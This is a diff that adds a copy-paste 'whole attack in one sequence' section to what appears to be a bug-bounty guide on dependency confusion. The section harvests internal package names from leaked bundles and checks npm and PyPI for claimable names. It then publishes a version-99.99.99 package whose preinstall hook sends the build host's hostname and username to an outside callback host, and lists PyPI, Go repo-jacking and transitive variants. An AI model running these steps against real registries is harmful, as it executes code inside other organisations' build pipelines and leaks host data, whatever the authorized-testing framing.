@@ -7,6 +7,50 @@ report. The finding is a **callback from the target's build** — never a payloa
 
 ---
 
+## The whole attack in one sequence (copy-paste — leaked name → benign CI callback)
+
+*What & when:* the end-to-end flagship as one authorized, responsible sequence — the arsenal twin of guide **§8.1**. Detection-heavy, publish-light: confirm claimability read-only, publish a **benign** beacon for a name **in your authorized scope**, catch **one** callback, **unpublish**, report. The callback alone is the whole Critical — no payload.
+
+```bash
+OOB=k7f2p.oast.pro                                      # your interactsh/Collaborator host
+
+# --- Step 0: RECON — harvest an internal name from a leaked bundle/manifest (guide §2, ../JSFiles/) ---
+grep -oE '@[a-z0-9._-]+/[a-z0-9._-]+' app.bundle.js | sort -u    # -> @acme/config, @acme/telemetry (org-specific)
+
+# --- Step 1: CLAIMABILITY — read-only public-registry 404 = you can register it (guide §4) ---
+curl -s -o /dev/null -w '%{http_code}\n' https://registry.npmjs.org/@acme%2Fconfig   # 404 = CLAIMABLE
+curl -s -o /dev/null -w '%{http_code}\n' https://registry.npmjs.org/-/org/acme       # 404 = @acme SCOPE unreserved (all @acme/* confusable)
+#   PyPI variant:  curl -s -o /dev/null -w '%{http_code}\n' https://pypi.org/pypi/<name>/json   (404 = claimable)
+
+# --- Step 2: BENIGN beacon package, version HIGH so highest-version-wins (authorized name ONLY, guide §7) ---
+#   package.json: {"name":"@acme/config","version":"99.99.99","scripts":{"preinstall":"node beacon.js"}}
+#   beacon.js (the ENTIRE payload — token + where it ran, nothing else):
+cat > beacon.js <<'EOF'
+const https=require('https'),os=require('os');
+https.get(`https://k7f2p.oast.pro/?t=DCPOC&h=${os.hostname()}&u=${os.userInfo().username}`);
+EOF
+
+# --- Step 3: PUBLISH (authorized), then wait for their next build ---
+npm publish --access public                             # + @acme/config@99.99.99
+
+# --- Step 4: CALLBACK from THEIR CI = RCE in the pipeline (guide §12) ---
+#   [interactsh]  GET k7f2p.oast.pro ?t=DCPOC&h=fv-az417-3&u=runner  from 20.55.x.x  (GitHub Actions runner)
+#   token = yours · runner/fv-az + Actions IP = ran in their CI = Critical.
+
+# --- Step 5: UNPUBLISH immediately + report so they reserve the scope (guide §16) ---
+npm unpublish @acme/config@99.99.99 --force             # (or `npm deprecate` if unpublish is blocked); record the window
+```
+
+**Alternate cash-outs (same "benign callback, unpublish, report" ending — pick by ecosystem):**
+```bash
+# PyPI (pip --extra-index-url highest-version-wins = the classic, guide §6): setup.py beacon @ version 99.99.99, twine upload, then yank.
+# Repo-jacking a namespaced ecosystem (Go, guide §10): a go.mod importing github.com/<user>/pkg where <user> 404s ->
+#   register that freed GitHub username, host the module -> their `go get`/build pulls yours -> benign beacon.
+# Transitive: a PUBLIC pkg that depends on an internal name -> confusion fires even if the top-level dep is pinned.
+```
+
+---
+
 ## 0. Recon — where internal package names leak (Guide §2)
 
 *What & when:* your very first step — you can't claim a name you don't know. These commands harvest **internal package names** from files that list dependencies (**manifests**), from compiled front-end JavaScript (**bundles**), and from committed config that proves a private store exists. Run the `grep` lines against any JS/manifest you download; run the GitHub/GitLab **dorks** (targeted search queries) to find them at scale. Output = a candidate name list for §1.
